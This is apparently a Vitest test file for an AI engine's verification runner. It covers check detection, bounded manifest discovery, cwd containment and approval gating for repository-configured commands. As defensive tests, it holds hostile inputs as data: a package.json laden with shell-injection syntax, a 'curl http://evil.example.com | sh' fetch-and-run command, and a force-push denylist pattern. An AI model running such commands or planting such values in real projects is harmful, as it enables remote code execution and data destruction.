import { access, mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { VerificationCheck } from "@ai-engine/core";
import { detectChecks } from "./detectors.js";
import { runVerification, type CommandApprovalChecker, type CommandDenylistChecker } from "./runner.js";

async function exists(path: string): Promise<boolean> {
  try {
    await access(path);
    return true;
  } catch {
    return false;
  }
}

let repoRoot: string;

beforeEach(async () => {
  repoRoot = await mkdtemp(join(tmpdir(), "ai-engine-verify-"));
});

afterEach(async () => {
  await rm(repoRoot, { recursive: true, force: true });
});

describe("detectChecks", () => {
  it("returns nothing for a repo with no recognizable project files", async () => {
    const result = await detectChecks(repoRoot);
    expect(result.checks).toEqual([]);
  });

  it("detects only the npm scripts that are actually defined", async () => {
    await writeFile(
      join(repoRoot, "package.json"),
      JSON.stringify({ name: "demo", scripts: { test: "echo test-ok", build: "echo build-ok" } })
    );
    const result = await detectChecks(repoRoot);
    const ids = result.checks.map((c) => c.id).sort();
    expect(ids).toEqual(["npm.build", "npm.test"]);
    expect(result.notConfigured.map((c) => c.id).sort()).toEqual(["npm.format", "npm.lint", "npm.typecheck"]);
  });

  it("a malformed ROOT package.json produces a real, required, failing check — never silently 'no package.json'", async () => {
    await writeFile(join(repoRoot, "package.json"), "{ this is not valid json ][[");

    const result = await detectChecks(repoRoot);
    const rootCheck = result.checks.find((c) => c.id === "npm.root");
    expect(rootCheck).toBeTruthy();
    expect(rootCheck?.requiredForReady).toBe(true);

    const report = await runVerification("task-1", result.checks, result.notConfigured);
    expect(report.results.find((r) => r.checkId === "npm.root")?.status).toBe("FAIL");

    const { verificationPassed } = await import("@ai-engine/core");
    expect(verificationPassed(report, result.checks)).toBe(false);
  });

  /**
   * Regression for a real, independently-found shell-injection defect: an earlier
   * version of the npm.root check interpolated the caught JSON.parse error message
   * directly into a `shell: true` command string (quoted with JSON.stringify, which
   * is JSON escaping, not shell escaping). Since that error message is derived from
   * repository-controlled bytes (the malformed package.json itself), a crafted
   * package.json could make the "error message" contain live shell syntax that
   * would then actually execute. The fix removes ALL dynamic content from the
   * command — this proves it holds even when the parse error is deliberately
   * laden with shell metacharacters.
   */
  it("a shell-metacharacter-laden parse error can never become executable shell syntax", async () => {
    const marker = join(repoRoot, "PWNED_FROM_PARSE_ERROR");
    // Deliberately malformed JSON — invalid on its own terms — whose bad token is
    // itself live shell syntax that a naive "interpolate the parse error" fix would
    // have handed straight to a real shell.
    await writeFile(join(repoRoot, "package.json"), `{ "bad": $(touch ${marker}), "x": \`; rm -rf /nonexistent\` && echo pwned }`);

    const result = await detectChecks(repoRoot);
    const rootCheck = result.checks.find((c) => c.id === "npm.root");
    expect(rootCheck).toBeTruthy();
    // The command must be fully static — the same one, every time, regardless of
    // what the parse error actually says.
    expect(rootCheck?.command).toBe("exit 1");

    const report = await runVerification("task-1", result.checks, result.notConfigured);
    expect(report.results.find((r) => r.checkId === "npm.root")?.status).toBe("FAIL");
    // The strongest proof: if the metacharacters above had ever reached a real
    // shell, this file would exist. It must not.
    expect(await exists(marker)).toBe(false);
  });

  it("detects Foundry checks when foundry.toml is present", async () => {
    await writeFile(join(repoRoot, "foundry.toml"), "[profile.default]\n");
    const result = await detectChecks(repoRoot);
    const ids = result.checks.map((c) => c.id);
    expect(ids).toContain("forge.build");
    expect(ids).toContain("forge.test");
  });

  describe("bounded nested manifest discovery", () => {
    it("detects a Foundry project nested under a package directory, with a path-qualified id and correct cwd", async () => {
      const nested = join(repoRoot, "packages", "contracts");
      await mkdir(nested, { recursive: true });
      await writeFile(join(nested, "foundry.toml"), "[profile.default]\n");

      const result = await detectChecks(repoRoot);
      const test = result.checks.find((c) => c.id === "forge.test:packages/contracts");
      expect(test).toBeTruthy();
      expect(test?.cwd).toBe(nested);
      expect(result.checks.map((c) => c.id)).toContain("forge.build:packages/contracts");
    });

    it("root and nested Foundry projects both produce checks, with distinct, non-colliding ids", async () => {
      await writeFile(join(repoRoot, "foundry.toml"), "[profile.default]\n");
      const nested = join(repoRoot, "packages", "contracts");
      await mkdir(nested, { recursive: true });
      await writeFile(join(nested, "foundry.toml"), "[profile.default]\n");

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);

      // root keeps its original, unsuffixed ids — backward compatible
      expect(ids).toContain("forge.test");
      expect(ids).toContain("forge.build");
      // nested gets its own, distinct, path-qualified ids
      expect(ids).toContain("forge.test:packages/contracts");
      expect(ids).toContain("forge.build:packages/contracts");
      // no accidental collision: every id is unique
      expect(new Set(ids).size).toBe(ids.length);

      const rootCheck = result.checks.find((c) => c.id === "forge.test");
      const nestedCheck = result.checks.find((c) => c.id === "forge.test:packages/contracts");
      expect(rootCheck?.cwd).toBe(repoRoot);
      expect(nestedCheck?.cwd).toBe(nested);
    });

    it("does not discover a manifest inside an ignored directory (node_modules, lib, etc.)", async () => {
      const insideNodeModules = join(repoRoot, "node_modules", "some-dep");
      await mkdir(insideNodeModules, { recursive: true });
      await writeFile(join(insideNodeModules, "foundry.toml"), "[profile.default]\n");

      const insideLib = join(repoRoot, "lib", "forge-std");
      await mkdir(insideLib, { recursive: true });
      await writeFile(join(insideLib, "foundry.toml"), "[profile.default]\n");

      const result = await detectChecks(repoRoot);
      expect(result.checks).toEqual([]);
    });

    it("does not discover an npm package.json inside an ignored directory either — the same unified traversal applies to both manifest types", async () => {
      const insideNodeModules = join(repoRoot, "node_modules", "some-dep");
      await mkdir(insideNodeModules, { recursive: true });
      await writeFile(join(insideNodeModules, "package.json"), JSON.stringify({ name: "dep", scripts: { test: "echo no" } }));

      const result = await detectChecks(repoRoot);
      expect(result.checks).toEqual([]);
    });

    it("does not discover a manifest inside a symlinked directory, even though the real directory it points to is itself discoverable", async () => {
      const real = join(repoRoot, "real-lib");
      await mkdir(real, { recursive: true });
      await writeFile(join(real, "foundry.toml"), "[profile.default]\n");
      await symlink(real, join(repoRoot, "linked"), "dir");

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);
      expect(ids).toContain("forge.test:real-lib"); // the real directory, reached directly, is fine
      expect(ids).not.toContain("forge.test:linked"); // never reached via the symlink
    });

    it("two sibling nested Foundry projects (no project at the root itself) both produce independent, non-colliding checks", async () => {
      const a = join(repoRoot, "packages", "a");
      const b = join(repoRoot, "packages", "b");
      await mkdir(a, { recursive: true });
      await mkdir(b, { recursive: true });
      await writeFile(join(a, "foundry.toml"), "[profile.default]\n");
      await writeFile(join(b, "foundry.toml"), "[profile.default]\n");

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);
      expect(ids).toContain("forge.test:packages/a");
      expect(ids).toContain("forge.test:packages/b");
      expect(ids).not.toContain("forge.test"); // no root project exists here
      expect(new Set(ids).size).toBe(ids.length);
    });

    it("does not discover a manifest beyond the configured maximum depth", async () => {
      // MAX_DISCOVERY_DEPTH is 3: repoRoot = depth 0, so a manifest 4 directories down
      // (depth 4) must be missed, while one 3 directories down (depth 3) must be found.
      const withinDepth = join(repoRoot, "a", "b", "c");
      await mkdir(withinDepth, { recursive: true });
      await writeFile(join(withinDepth, "foundry.toml"), "[profile.default]\n");

      const beyondDepth = join(repoRoot, "x", "y", "z", "w");
      await mkdir(beyondDepth, { recursive: true });
      await writeFile(join(beyondDepth, "foundry.toml"), "[profile.default]\n");

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);
      expect(ids).toContain("forge.test:a/b/c");
      expect(ids).not.toContain("forge.test:x/y/z/w");
    });

    it("a malformed NESTED package.json is skipped silently and never affects root or sibling discovery", async () => {
      await writeFile(join(repoRoot, "package.json"), JSON.stringify({ name: "root", scripts: { build: "echo ok" } }));
      const broken = join(repoRoot, "packages", "broken");
      await mkdir(broken, { recursive: true });
      await writeFile(join(broken, "package.json"), "{ this is not valid json ][[");
      const sdk = join(repoRoot, "packages", "sdk");
      await mkdir(sdk, { recursive: true });
      await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { test: "echo ok" } }));

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);
      expect(ids).toContain("npm.build"); // root: unaffected
      expect(ids).toContain("npm.test:packages/sdk"); // sibling nested package: unaffected
      expect(ids).not.toContain("npm.root"); // this is NOT the root-malformed path
      expect(ids.some((id) => id.includes("broken"))).toBe(false); // the broken one just produces nothing
    });

    it("detects a nested npm package's own script when nothing at root proxies it", async () => {
      await writeFile(join(repoRoot, "package.json"), JSON.stringify({ name: "root", scripts: {} }));
      const sdk = join(repoRoot, "packages", "sdk");
      await mkdir(sdk, { recursive: true });
      await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { test: "echo sdk-test" } }));

      const result = await detectChecks(repoRoot);
      const check = result.checks.find((c) => c.id === "npm.test:packages/sdk");
      expect(check).toBeTruthy();
      expect(check?.cwd).toBe(sdk);
      expect(check?.command).toBe("npm run test");
    });

    it("does add a nested npm script for a name root does NOT proxy, even if root defines other scripts", async () => {
      await writeFile(
        join(repoRoot, "package.json"),
        JSON.stringify({
          name: "root",
          workspaces: ["packages/*"],
          scripts: { typecheck: "npm run typecheck --workspaces --if-present" }
        })
      );
      const frontend = join(repoRoot, "apps", "frontend");
      await mkdir(frontend, { recursive: true });
      await writeFile(join(frontend, "package.json"), JSON.stringify({ name: "frontend", scripts: { lint: "eslint ." } }));

      const result = await detectChecks(repoRoot);
      const check = result.checks.find((c) => c.id === "npm.lint:apps/frontend");
      expect(check).toBeTruthy();
      expect(check?.cwd).toBe(frontend);
    });

    describe("npm workspace-aware de-duplication", () => {
      it("suppresses a nested script genuinely proxied by a root --workspaces script, for a package the array-form workspaces config actually includes", async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({
            name: "root",
            workspaces: ["packages/*"],
            scripts: { typecheck: "npm run typecheck --workspaces --if-present" }
          })
        );
        const sdk = join(repoRoot, "packages", "sdk");
        await mkdir(sdk, { recursive: true });
        await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        const ids = result.checks.map((c) => c.id);
        expect(ids).toContain("npm.typecheck"); // the root proxy check itself still runs
        expect(ids).not.toContain("npm.typecheck:packages/sdk"); // not duplicated per-package
      });

      it("supports the object-with-packages workspaces form", async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({
            name: "root",
            workspaces: { packages: ["packages/*"] },
            scripts: { typecheck: "npm run typecheck --workspaces --if-present" }
          })
        );
        const sdk = join(repoRoot, "packages", "sdk");
        await mkdir(sdk, { recursive: true });
        await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        expect(result.checks.map((c) => c.id)).not.toContain("npm.typecheck:packages/sdk");
      });

      it('a root script merely containing the text "--workspaces" without actually invoking npm does NOT suppress anything', async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({
            name: "root",
            workspaces: ["packages/*"],
            scripts: { typecheck: "echo --workspaces" } // not an npm invocation at all
          })
        );
        const sdk = join(repoRoot, "packages", "sdk");
        await mkdir(sdk, { recursive: true });
        await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        const check = result.checks.find((c) => c.id === "npm.typecheck:packages/sdk");
        expect(check).toBeTruthy(); // still added — root never genuinely proxied it
        expect(check?.cwd).toBe(sdk);
      });

      it("a genuine --workspaces script does NOT suppress a package excluded from the configured workspaces", async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({
            name: "root",
            workspaces: ["packages/*"], // does NOT include apps/*
            scripts: { typecheck: "npm run typecheck --workspaces --if-present" }
          })
        );
        const frontend = join(repoRoot, "apps", "frontend");
        await mkdir(frontend, { recursive: true });
        await writeFile(join(frontend, "package.json"), JSON.stringify({ name: "frontend", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        const check = result.checks.find((c) => c.id === "npm.typecheck:apps/frontend");
        expect(check).toBeTruthy(); // root's --workspaces fan-out would never actually reach this package
        expect(check?.cwd).toBe(frontend);
      });

      it("does not suppress anything when root has a --workspaces script but no workspaces configuration at all", async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({ name: "root", scripts: { typecheck: "npm run typecheck --workspaces --if-present" } })
        );
        const sdk = join(repoRoot, "packages", "sdk");
        await mkdir(sdk, { recursive: true });
        await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        expect(result.checks.map((c) => c.id)).toContain("npm.typecheck:packages/sdk");
      });

      it("does not suppress a nested check when root's --workspaces script targets a DIFFERENT script name than the one being evaluated", async () => {
        await writeFile(
          join(repoRoot, "package.json"),
          JSON.stringify({
            name: "root",
            workspaces: ["packages/*"],
            // Genuinely invokes npm with --workspaces — but for "build", not "typecheck".
            scripts: { typecheck: "npm run build --workspaces --if-present" }
          })
        );
        const sdk = join(repoRoot, "packages", "sdk");
        await mkdir(sdk, { recursive: true });
        await writeFile(join(sdk, "package.json"), JSON.stringify({ name: "sdk", scripts: { typecheck: "tsc --noEmit" } }));

        const result = await detectChecks(repoRoot);
        // Must NOT be suppressed: root's typecheck script doesn't actually fan out typecheck.
        expect(result.checks.map((c) => c.id)).toContain("npm.typecheck:packages/sdk");
      });
    });

    it("discovers both foundry.toml and package.json in one traversal (a single nested directory can be a project of both kinds)", async () => {
      const contracts = join(repoRoot, "packages", "contracts");
      await mkdir(contracts, { recursive: true });
      await writeFile(join(contracts, "foundry.toml"), "[profile.default]\n");
      await writeFile(join(contracts, "package.json"), JSON.stringify({ name: "contracts", scripts: { test: "echo ok" } }));

      const result = await detectChecks(repoRoot);
      const ids = result.checks.map((c) => c.id);
      expect(ids).toContain("forge.test:packages/contracts");
      expect(ids).toContain("npm.test:packages/contracts");
    });

    it("stops safely once the visited-directory bound is reached, instead of walking unbounded, and cannot silently pass READY", async () => {
      // MAX_VISITED_DIRECTORIES is 400 — create enough sibling directories that the
      // bound is hit partway through, and confirm discovery still completes (rather
      // than hanging or throwing) and blocks the READY gate — not merely mentions it.
      const siblingCount = 420;
      await Promise.all(Array.from({ length: siblingCount }, (_, i) => mkdir(join(repoRoot, `pkg-${String(i).padStart(4, "0")}`))));

      const { checks, notConfigured } = await detectChecks(repoRoot);
      const boundedCheck = checks.find((c) => c.id === "discovery.bounded");
      expect(boundedCheck).toBeTruthy();
      expect(boundedCheck?.requiredForReady).toBe(true);

      const report = await runVerification("task-1", checks, notConfigured);
      expect(report.results.find((r) => r.checkId === "discovery.bounded")?.status).toBe("FAIL");

      const { verificationPassed } = await import("@ai-engine/core");
      expect(verificationPassed(report, checks)).toBe(false);
    });

    it("stops reading a single directory once its entry count exceeds MAX_ENTRIES_PER_DIRECTORY, independent of the visited-directory bound", async () => {
      // Distinct from the test above: that one exercises MAX_VISITED_DIRECTORIES via
      // many separate sibling directories. This one puts everything inside a single
      // directory to specifically exercise MAX_ENTRIES_PER_DIRECTORY (2000) — a
      // second independent review found the previous readdir()-based implementation
      // only checked this bound *after* materializing the whole directory, defeating
      // the point of a resource bound.
      const wide = join(repoRoot, "wide");
      await mkdir(wide, { recursive: true });
      // repoRoot + "wide" is only 2 visited directories total — nowhere near
      // MAX_VISITED_DIRECTORIES (400) — so if truncation fires here, it can only be
      // attributable to the per-directory entry bound, not the directory-visit one.
      await Promise.all(Array.from({ length: 2100 }, (_, i) => writeFile(join(wide, `f-${String(i).padStart(5, "0")}`), "")));

      const result = await detectChecks(repoRoot);
      expect(result.checks.map((c) => c.id)).toContain("discovery.bounded");
    });
  });
});

describe("runVerification", () => {
  it("runs a passing and a failing check and reports structured statuses", async () => {
    await writeFile(join(repoRoot, "package.json"), JSON.stringify({ name: "demo", scripts: { build: "exit 0", test: "exit 1" } }));
    const { checks, notConfigured } = await detectChecks(repoRoot);
    const report = await runVerification("task-1", checks, notConfigured);

    const byId = Object.fromEntries(report.results.map((r) => [r.checkId, r]));
    expect(byId["npm.build"]?.status).toBe("PASS");
    expect(byId["npm.test"]?.status).toBe("FAIL");
    expect(byId["npm.lint"]?.status).toBe("NOT_CONFIGURED");
  });

  it("marks project-disabled checks as SKIPPED without running them", async () => {
    await writeFile(join(repoRoot, "package.json"), JSON.stringify({ name: "demo", scripts: { lint: "exit 1" } }));
    const { checks } = await detectChecks(repoRoot);
    const report = await runVerification("task-1", checks, [], ["npm.lint"]);
    expect(report.results[0]).toMatchObject({ checkId: "npm.lint", status: "SKIPPED" });
  });

  it("auto_detected checks (no origin gate needed) still run exactly as before", async () => {
    await writeFile(join(repoRoot, "package.json"), JSON.stringify({ name: "demo", scripts: { build: "exit 0" } }));
    const { checks } = await detectChecks(repoRoot);
    const report = await runVerification("task-1", checks, []);
    expect(report.results.find((r) => r.checkId === "npm.build")?.status).toBe("PASS");
  });

  describe("execution-time cwd containment", () => {
    it("still runs a legitimate check whose cwd is genuinely inside the repository root", async () => {
      const nested = join(repoRoot, "packages", "sdk");
      await mkdir(nested, { recursive: true });
      const check: VerificationCheck = {
        id: "npm.test:packages/sdk",
        description: "npm test",
        command: "exit 0",
        cwd: nested,
        requiredForReady: true,
        origin: "auto_detected"
      };

      const report = await runVerification("task-1", [check], [], { repoRoot });
      expect(report.results[0]?.status).toBe("PASS");
    });

    it("executes at the resolved real cwd, not the original (possibly symlinked) one — proving the validated path is the path actually used", async () => {
      const real = join(repoRoot, "real-dir");
      await mkdir(real, { recursive: true });
      const linked = join(repoRoot, "linked-dir");
      await symlink(real, linked, "dir");

      const check: VerificationCheck = {
        id: "pwd.check",
        description: "prints its own cwd",
        command: "pwd",
        cwd: linked, // the symlink, not the real directory
        requiredForReady: true,
        origin: "auto_detected"
      };

      const report = await runVerification("task-1", [check], [], { repoRoot });
      expect(report.results[0]?.status).toBe("PASS");
      const printedCwd = report.results[0]?.output?.trim();
      expect(printedCwd).toBe(await realpath(real)); // not `linked` — the resolved path was what actually ran
    });

    it("refuses to execute a check whose cwd resolves outside the repository root, even though it's marked auto_detected", async () => {
      const outside = await mkdtemp(join(tmpdir(), "ai-engine-outside-"));
      try {
        const check: VerificationCheck = {
          id: "npm.test:escaped",
          description: "npm test",
          command: "exit 0",
          cwd: outside,
          requiredForReady: true,
          origin: "auto_detected"
        };

        const report = await runVerification("task-1", [check], [], { repoRoot });
        expect(report.results[0]?.status).toBe("FAIL");
        expect(report.results[0]?.reason).toMatch(/outside the repository root/);
      } finally {
        await rm(outside, { recursive: true, force: true });
      }
    });

    it("does not enforce containment when repoRoot is not supplied (backward compatible with existing callers)", async () => {
      const outside = await mkdtemp(join(tmpdir(), "ai-engine-outside-"));
      try {
        const check: VerificationCheck = {
          id: "some.check",
          description: "no repoRoot passed",
          command: "exit 0",
          cwd: outside,
          requiredForReady: true,
          origin: "auto_detected"
        };

        const report = await runVerification("task-1", [check], []); // no repoRoot option
        expect(report.results[0]?.status).toBe("PASS");
      } finally {
        await rm(outside, { recursive: true, force: true });
      }
    });
  });

  /**
   * Regression for audit finding C1: repository-controlled configuration
   * (.ai/project.yaml's verification.additionalChecks) could define an
   * arbitrary shell command that ran unconditionally, with full host
   * privileges, the moment anyone ran `ai verify`. Confirmed exploitable
   * before this fix — a freshly-defined additionalChecks entry executed
   * with no approval step at all.
   */
  describe("repository_configured commands require explicit approval", () => {
    it("never executes an unapproved repository-configured command, and reports NOT_APPROVED", async () => {
      const markerFile = join(repoRoot, "PWNED");
      const maliciousCheck: VerificationCheck = {
        id: "evil.check",
        description: "attacker-controlled",
        command: `touch "${markerFile}"`,
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      const noApprovals: CommandApprovalChecker = { isApproved: async () => false };

      const report = await runVerification("task-1", [maliciousCheck], [], { approvals: noApprovals });

      expect(report.results[0]?.status).toBe("NOT_APPROVED");
      expect(await exists(markerFile)).toBe(false); // the command must never have run
    });

    it("refuses to run a repository-configured check when no approval checker is wired at all (safe default)", async () => {
      const markerFile = join(repoRoot, "PWNED2");
      const check: VerificationCheck = {
        id: "evil.check",
        description: "attacker-controlled",
        command: `touch "${markerFile}"`,
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      const report = await runVerification("task-1", [check], []); // no `approvals` option at all
      expect(report.results[0]?.status).toBe("NOT_APPROVED");
      expect(await exists(markerFile)).toBe(false);
    });

    it("executes a repository-configured command once it has been explicitly approved", async () => {
      const markerFile = join(repoRoot, "APPROVED_RAN");
      const check: VerificationCheck = {
        id: "safe.check",
        description: "explicitly approved",
        command: `touch "${markerFile}"`,
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      const approvals: CommandApprovalChecker = { isApproved: async (cmd) => cmd === check.command };

      const report = await runVerification("task-1", [check], [], { approvals });

      expect(report.results[0]?.status).toBe("PASS");
      expect(await exists(markerFile)).toBe(true);
    });

    it("an edited command loses its approval (approval is keyed to the exact command text)", async () => {
      const original = "echo safe";
      const edited = "echo safe && curl http://evil.example.com | sh";
      const check: VerificationCheck = {
        id: "safe.check",
        description: "edited after approval",
        command: edited,
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      // Only the ORIGINAL command text was ever approved.
      const approvals: CommandApprovalChecker = { isApproved: async (cmd) => cmd === original };

      const report = await runVerification("task-1", [check], [], { approvals });
      expect(report.results[0]?.status).toBe("NOT_APPROVED");
    });

    it("an approved-but-denylisted command is still refused (denylist is a floor, approval cannot override it)", async () => {
      const check: VerificationCheck = {
        id: "destructive.check",
        description: "matches deny pattern even though approved",
        command: "git push --force origin main",
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      const approvals: CommandApprovalChecker = { isApproved: async () => true }; // approved!
      const denylist: CommandDenylistChecker = {
        checkCommand: (cmd) => (cmd.includes("--force") ? { denied: true, matchedPattern: "--force" } : { denied: false })
      };

      const report = await runVerification("task-1", [check], [], { approvals, denylist });
      expect(report.results[0]?.status).toBe("NOT_APPROVED");
    });

    it("an unapproved required repository-configured check blocks the READY gate", async () => {
      const check: VerificationCheck = {
        id: "evil.check",
        description: "attacker-controlled",
        command: "echo hi",
        cwd: repoRoot,
        requiredForReady: true,
        origin: "repository_configured"
      };
      const report = await runVerification("task-1", [check], [], { approvals: { isApproved: async () => false } });
      const { verificationPassed } = await import("@ai-engine/core");
      expect(verificationPassed(report, [check])).toBe(false);
    });
  });
});
